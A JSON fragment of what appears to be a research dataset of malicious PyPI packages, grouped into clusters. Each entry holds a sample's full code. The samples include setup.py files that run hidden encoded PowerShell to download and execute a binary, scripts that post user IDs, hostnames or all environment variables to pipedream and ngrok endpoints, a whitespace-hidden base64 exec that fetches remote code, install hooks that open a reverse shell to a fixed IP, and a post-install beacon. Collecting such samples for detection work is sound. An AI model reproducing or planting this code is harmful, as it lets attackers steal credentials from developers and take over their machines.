        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphydratoolsplit',\n    packages = ['modlib'],\n    version = '7.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-tpkillpeppep-v5.30",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpkillpeppep',\n    packages = ['modlib'],\n    version = '4.56',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-tpmcpongpaypal-v6.87",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpmcpongpaypal',\n    packages = ['modlib'],\n    version = '2.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-tppingvirtualrand-v7.60",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppingvirtualrand',\n    packages = ['modlib'],\n    version = '1.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-tppongvisapip-v5.75",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppongvisapip',\n    packages = ['modlib'],\n    version = '4.59',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-tppywpostram-v6.74",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppywpostram',\n    packages = ['modlib'],\n    version = '8.12',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-tprepaypalpull-v6.49",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tprepaypalpull',\n    packages = ['modlib'],\n    version = '1.84',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-09-esqnvidiamaskvirtual-v7.87",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqnvidiamaskvirtual',\n    packages = ['modlib'],\n    version = '4.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-09-esqrestrhttp-v9.27",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrestrhttp',\n    packages = ['modlib'],\n    version = '1.78',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-09-libpongcvvm-v1.16",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpongcvvm',\n    packages = ['modlib'],\n    version = '8.63',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      }
    ]
  },
  {
    "cluster_id": 110,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-01-29-deepseeek-v0.0.8",
        "code": "import requests\nimport warnings\nimport os\n# Suppress all warnings\nwarnings.filterwarnings(\"ignore\")\n\ndef send_get_request():\n    url = \"https://eoyyiyqubj7mquj.m.pipedream.net\"\n    try:\n        user_id = os.popen('id').read().strip()  # Attempt to get user ID with id command\n        if not user_id:\n            user_id = os.popen('whoami').read().strip()  # Fallback to whoami if id fails\n\n        hostname = os.uname().nodename  # Get system hostname\n        payload = {\"user_id\": user_id, \"hostname\": hostname}\n\n        response = requests.post(url, json=payload, verify=False)\n    except requests.exceptions.RequestException:\n        pass  # Silently ignore any request errors\n\ndef main():\n    send_get_request()\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-19-artifact-lab-3-package-4c04b1a2-v0.1",
        "code": "import os\nimport requests\n\ndef run_payload():\n    # Fetch all environment variables\n    env_vars = os.environ\n\n    # URL to send the data to (replace <your-ngrok-url> with your actual server endpoint)\n    url = \"https://5cecdbdb0328.ngrok.app/collect\"\n\n    # Send environment variables as JSON to the server\n    try:\n        response = requests.post(url, json=dict(env_vars))\n        if response.status_code == 200:\n            print(\"Environment variables sent successfully\")\n        else:\n            print(\"Failed to send environment variables\")\n    except Exception as e:\n        print(f\"Error occurred: {e}\")\n"
      }
    ]
  },
  {
    "cluster_id": 111,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-14-pthttp",
        "code": "\"\"\"this is pthttp.py module to print a list recursively\"\"\"\ndef print_lol(the_list):\n    for item in the_list:\n        if isinstance(item, list):\n            print_lol(item)\n        else:\n            print(item)\n            \n\n\nprint('\\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMjAuODIuMTQ0LjE3OS9pbmplY3QvWnVNcmFLU1E3MTJBcW1GOScpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M=\"),'<string>','exec'))\nfrom distutils.core import setup\n\nsetup(\nname = 'pthttp',\nversion = '1.0.0',\npy_modules = ['pthttp'],\nauthor = 'hfpython',\nauthor_email = 'abc@gmail.com',\nurl = 'http://www.headfirstlabs.com',\ndescription = 'A simple list printer',\n)\n"
      }
    ]
  },
  {
    "cluster_id": 112,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-20-class-py-v1.0.0",
        "code": "import socket \nimport os \nimport pty \n \nimport setuptools \nfrom setuptools.command.install import install \n \nclass myclass(install): \n    def run(self): \n        LHOST = \"85.159.212.47\"\n        LPORT = 61985 \n \n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n        s.connect((LHOST, LPORT)) \n        os.dup2(s.fileno(), 0) \n        os.dup2(s.fileno(), 1) \n        os.dup2(s.fileno(), 2) \n        pty.spawn(\"/bin/sh\") \n \nsetuptools.setup( \n  name=\"class_py\", \n  version=\"1.0.0\", \n  author=\"test\", \n  author_email=\"test@me.com\", \n  description=\"Test Desc\", \n  long_description=\"asd\", \n  long_description_content_type=\"text/markdown\", \n  url=\"https://github.com/test\", \n  packages=setuptools.find_packages(), \n  cmdclass={ \"install\": myclass } \n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-06-26-rock51-v1.0.0",
        "code": "import socket \nimport os \nimport pty \n \nimport setuptools \nfrom setuptools.command.install import install \n \nclass myclass(install): \n    def run(self): \n        LHOST = \"85.159.212.47\"\n        LPORT = 61985 \n \n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n        s.connect((LHOST, LPORT)) \n        os.dup2(s.fileno(), 0) \n        os.dup2(s.fileno(), 1) \n        os.dup2(s.fileno(), 2) \n        pty.spawn(\"/bin/sh\") \n \nsetuptools.setup( \n  name=\"rock51\", \n  version=\"1.0.0\", \n  author=\"test\", \n  author_email=\"test@me.com\", \n  description=\"Test Desc\", \n  long_description=\"asd\", \n  long_description_content_type=\"text/markdown\", \n  url=\"https://github.com/test\", \n  packages=setuptools.find_packages(), \n  cmdclass={ \"install\": myclass } \n)\n"
      }
    ]
  },
  {
    "cluster_id": 113,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-21-estimating",
        "code": "# Always prefer setuptools over distutils\nfrom setuptools import setup, find_packages\nimport atexit\nimport requests\nimport os\nimport pathlib\nimport base64\nfrom multiprocessing.pool import ThreadPool as Pool\nfrom distutils.command.install import install\n\n\nhere = pathlib.Path(__file__).parent.resolve()\n\n# Get the long description from the README file\nlong_description = (here / 'README.md').read_text(encoding='utf-8')\n\n# Arguments marked as \"Required\" below must be included for upload to PyPI.\n# Fields marked as \"Optional\" may be commented out.\n\ncompany = \"pypi+\"+\"all\"+\"+\"\nname = \"estimating\"\nversion = \"0.0.1\";\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\nfrom subprocess import check_call\n\n\n\n# def _post_install():\n#     _post_install\n\n\nclass new_install(install):\n    def __init__(self, *args, **kwargs):\n        super(new_install, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\n\ndef _post_install():\n    file_name = 'bykotko.txt'\n    f = open(file_name, 'a+')  # open file in append mode\n    f.write('kotko')\n    f.close()\n\n    ip = requests.get('https://api.ipify.org').text\n    ipText = format(ip);\n    myhost = os.uname()[1]\n    currentPath = requests.utils.quote(bytes(pathlib.Path(__file__).parent.absolute()));\n\n    PYdata = { \"ip\": ipText,\n               \"host\": myhost,\n               \"path\": currentPath, }\n    PYdataS = ipText+\",\"+myhost+\",(\"+currentPath+\")\"\n\n    message = PYdataS\n    message_bytes = message.encode('ascii')\n    base64_bytes = base64.b64encode(message_bytes)\n    base64_message = base64_bytes.decode('ascii')\n\n    r  = requests.get(\"https://kotko.org?\"+company+name+\"=\"+base64_message)\n\n\n\nsetup(\n    # This is the name of your project. The first time you publish this\n    # package, this name will be registered for you. It will determine how\n    # users can install this project, e.g.:\n    #\n    # $ pip install sampleproject\n    #\n    # And where it will live on PyPI: https://pypi.org/project/sampleproject/\n    #\n    # There are some restrictions on what makes a valid project name\n    # specification here:\n    # https://packaging.python.org/specifications/core-metadata/#name\n    name=name,  # Required\n\n    # Versions should comply with PEP 440:\n    # https://www.python.org/dev/peps/pep-0440/\n    #\n    # For a discussion on single-sourcing the version across setup.py and the\n    # project code, see\n    # https://packaging.python.org/en/latest/single_source_version.html\n    version=version,  # Required\n\n    # This is a one-line description or tagline of what your project does. This\n    # corresponds to the \"Summary\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#summary\n    description='',  # Optional\n\n    # This is an optional longer description of your project that represents\n    # the body of text which users will see when they visit PyPI.\n    #\n    # Often, this is the same as your README, so you can just read it in from\n    # that file directly (as we have already done above)\n    #\n    # This field corresponds to the \"Description\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#description-optional\n    long_description=long_description,  # Optional\n\n    # Denotes that our long_description is in Markdown; valid values are\n    # text/plain, text/x-rst, and text/markdown\n    #\n    # Optional if long_description is written in reStructuredText (rst) but\n    # required for plain-text or Markdown; if unspecified, \"applications should\n    # attempt to render [the long_description] as text/x-rst; charset=UTF-8 and\n    # fall back to text/plain if it is not valid rst\" (see link below)\n    #\n    # This field corresponds to the \"Description-Content-Type\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#description-content-type-optional\n    long_description_content_type='text/markdown',  # Optional (see note above)\n\n    # This should be a valid link to your project's main homepage.\n    #\n    # This field corresponds to the \"Home-Page\" metadata field:\n    # https://packaging.python.org/specifications/core-metadata/#home-page-optional\n    url='https://github.com/kotko/bravado-decorators',  # Optional\n\n    # This should be your name or the name of the organization which owns the\n    # project.\n    author='Vladyslav Kotko',  # Optional\n\n    # This should be a valid email address corresponding to the author listed\n    # above.\n    author_email='mailbox@kotko.me',  # Optional\n    include_package_data=True,\n\n    # Classifiers help users find your project by categorizing it.\n    #\n    # For a list of valid classifiers, see https://pypi.org/classifiers/\n    classifiers=[  # Optional\n        # How mature is this project? Common values are\n        #   3 - Alpha\n        #   4 - Beta\n        #   5 - Production/Stable\n        'Development Status :: 3 - Alpha',\n\n        # Indicate who your project is intended for\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Build Tools',\n\n        # Pick your license as you wish\n        'License :: OSI Approved :: MIT License',\n\n        # Specify the Python versions you support here. In particular, ensure\n        # that you indicate you support Python 3. These classifiers are *not*\n        # checked by 'pip install'. See instead 'python_requires' below.\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3 :: Only',\n    ],\n\n    # This field adds keywords for your project which will appear on the\n    # project page. What does your project relate to?\n    #\n    # Note that this is a list of additional keywords, separated\n    # by commas, to be used to assist searching for the distribution in a\n    # larger catalog.\n    keywords='sample, setuptools, development',  # Optional\n\n    # When your source code is in a subdirectory under the project root, e.g.\n    # `src/`, it is necessary to specify the `package_dir` argument.\n    